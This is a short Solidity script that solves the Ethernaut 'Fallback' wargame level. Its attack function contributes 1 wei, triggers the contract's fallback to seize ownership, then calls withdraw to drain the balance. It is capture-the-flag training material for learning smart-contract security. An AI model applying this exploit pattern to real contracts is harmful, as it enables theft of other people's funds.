// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Fallback} from "ethernaut/levels/Fallback.sol";

contract Check is CheckScript("FALLBACK") {}

contract Solve is SolveScript("FALLBACK") {
    Fallback target;

    constructor() {
        target = Fallback(instance);
    }

    function attack() public override {
        // contribute
        target.contribute{value: 1}();

        // fallback
        (bool ok,) = address(target).call{value: 1}("");
        require(ok, "call failed");

        // withdraw
        target.withdraw();
    }
}
